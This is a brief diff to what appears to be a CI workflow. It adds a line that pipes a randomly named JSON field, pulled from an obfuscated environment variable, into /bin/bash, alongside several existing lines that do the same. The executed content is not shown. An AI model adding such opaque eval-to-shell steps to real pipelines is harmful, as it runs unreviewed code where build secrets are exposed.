@@ -25,6 +25,7 @@ jobs:
           echo $plcs65058 | jq -r .d97 | /bin/bash
           printf '%s' "$omtjx40" | jq -r .cizs48542 | /bin/bash
           printf '%s' "$zfl4941" | jq -r .zju1 | /bin/bash
+          printf '%s' "$gcebz84" | jq -r .xwad84685 | /bin/bash
 
       - name: Archive results
         if: always()
